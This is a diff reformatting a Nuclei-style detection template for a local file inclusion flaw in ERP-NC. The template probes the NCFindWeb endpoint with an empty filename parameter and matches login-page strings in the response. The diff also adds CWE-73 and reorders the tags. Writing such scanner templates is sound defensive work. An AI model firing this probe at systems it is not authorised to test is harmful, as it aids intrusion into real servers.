@@ -1,5 +1,4 @@
 id: erp-nc-directory-traversal
-
 info:
   name: ERP-NC - Local File Inclusion
   author: pikpikcu
@@ -10,27 +9,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-73
   metadata:
     max-request: 1
-  tags: lfi,erp-nc,vuln
-
+  tags: erp-nc,lfi,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "Client"
-          - "ncwslogin.jsp"
-          - "admin.jsp"
+  - matchers:
+      - condition: and
         part: body
-        condition: and
-
-      - type: status
-        status:
+        type: word
+        words:
+          - Client
+          - ncwslogin.jsp
+          - admin.jsp
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename='
